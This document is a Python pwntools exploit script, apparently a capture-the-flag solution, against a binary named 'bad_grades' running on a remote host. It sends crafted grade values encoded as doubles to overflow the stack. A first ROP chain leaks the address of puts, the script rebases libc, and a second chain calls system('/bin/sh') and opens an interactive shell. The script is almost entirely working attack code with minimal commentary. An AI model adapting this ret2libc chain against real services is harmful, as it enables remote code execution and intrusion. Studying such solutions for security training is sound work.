#!/usr/bin/python3
from pwn import *
import struct

p = remote('188.166.169.77', 32196)
#p = process("./bad_grades")
#gdb.attach(p, "b *0x0401106")


def get_ready(raw_data):
    val = p64(raw_data).hex()
    return (struct.unpack("d", bytes.fromhex(val))[0])


elf = ELF("./bad_grades")
# need a libc leak to calculate base and rop to it
libc_elf = ELF("./libc.elf")

rop = ROP(elf)
rop2 = ROP(libc_elf)

def exploit_it(payloads, grades_count, go_interactive = False ):
    global p
    global rop
    
    # first menu option  
    p.recvuntil("> ")
    p.sendline(b"2")
    log.progress("Sending number of grades") 
    # second option
    p.recvuntil(b": ")
    p.sendline(grades_count)
    
    i = 0
    payload = b""
    # garbage filler
    while i < 35:
        if( i<33):
            payload = b"99"
        elif( i==33 or i == 34):
            payload = b"-"
        p.recvuntil(b": ")
        p.sendline(payload)
        i += 1 

    log.info("Sending payload")
    for payload in payloads:
        p.recvuntil(b": ")
        p.sendline("{}".format(payload))
    
    if go_interactive:
        log.success("Going interactive")
        p.interactive()
# rop chain to drop that delicious leak

main_addr = 0x00401108
payloads = [
    get_ready(rop.find_gadget(["pop rdi"])[0]),
    get_ready(elf.got["puts"]),
    get_ready(elf.plt["puts"]),
    get_ready(main_addr)
]
exploit_it(payloads, b"39")

log.progress("Payload SENT!")

# garbage receiver
p.recvline()

# carve puts_plt leaked address
puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.critical("Leak received --> {}".format(hex(puts_leak)))

# rebase libc_elf
libc_elf.address = puts_leak - libc_elf.symbols["puts"]
log.critical("Libc rebased @ {}".format(hex(libc_elf.address)))

log.progress("Redoing exploit chain...")

# recontextualize rop var
pop_rdi = libc_elf.address +  rop2.find_gadget(["pop rdi", "ret"])[0]
bin_sh  = next(libc_elf.search(b"/bin/sh"))
extra_ret = libc_elf.address + rop2.find_gadget(["ret"])[0]
system_addr = libc_elf.symbols.system

payloads = [
    get_ready(pop_rdi),
    get_ready(bin_sh),
    get_ready(extra_ret),
    get_ready(system_addr)
]

exploit_it(payloads, b"39", True)
